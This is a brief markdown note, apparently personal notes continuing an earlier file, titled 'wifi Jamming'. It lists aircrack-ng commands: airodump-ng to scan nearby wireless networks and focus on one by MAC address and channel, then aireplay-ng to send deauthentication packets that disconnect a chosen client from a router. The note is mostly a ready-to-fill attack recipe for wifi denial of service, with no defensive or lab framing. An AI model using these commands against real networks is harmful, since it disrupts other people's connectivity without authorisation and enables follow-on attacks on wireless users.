# wifi Jamming 

## Continuation on the 1st file 
### scanning all wifi
airodump-ng wlan0mon

### view more details of a specific wifi 
airodump-ng --bssid <macaddress> --channel <channel number> <interface>

### packet injection or deauthentication 
aireplay-ng --deauth <numbers of packet>  -a <router macaddress> -c <client macaddress> <interface>
